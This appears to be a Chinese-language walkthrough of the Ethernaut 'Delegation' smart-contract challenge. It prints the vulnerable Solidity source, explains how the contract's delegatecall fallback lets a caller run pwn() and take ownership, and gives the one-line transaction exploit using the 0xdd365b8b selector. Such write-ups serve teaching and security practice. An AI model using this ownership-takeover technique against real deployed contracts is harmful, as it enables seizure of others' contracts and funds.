# Delegation

> 这一关的目标是申明你对你创建实例的所有权.

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

## 攻击思路

网站暴露给我们Delegation的地址。我们可以触发Delegation合约的fallback函数同时在msg.data中发送Delegate的pwn函数调用

```js
// 0xdd365b8b 由 abi.encodeWithSignature("pwn()") 得到
await contract.sendTransaction({data:"0xdd365b8b"})
```

[The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7/)